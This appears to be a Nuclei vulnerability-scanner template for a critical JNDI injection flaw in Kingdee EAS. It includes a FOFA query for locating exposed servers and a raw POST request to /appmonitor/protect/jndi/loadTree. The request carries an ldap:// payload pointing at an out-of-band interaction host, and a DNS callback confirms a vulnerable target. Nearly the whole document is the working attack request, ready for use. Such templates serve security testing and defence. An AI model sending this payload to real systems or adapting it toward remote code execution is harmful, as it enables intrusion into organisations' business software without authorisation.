id: kingdee_eas_loadTree_jndi

info:
  name: kingdee_eas_loadTree_jndi
  author: PokerSec
  severity: critical
  metadata:
    fofasearch: body="/eassso/common/js"
  tags: kingdee,rce,kingdee-eas,ldap,jndi,apusic

http:
  - raw:
      - |
        POST /appmonitor/protect/jndi/loadTree HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        
        jndiName=ldap://{{interactsh-url}}

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"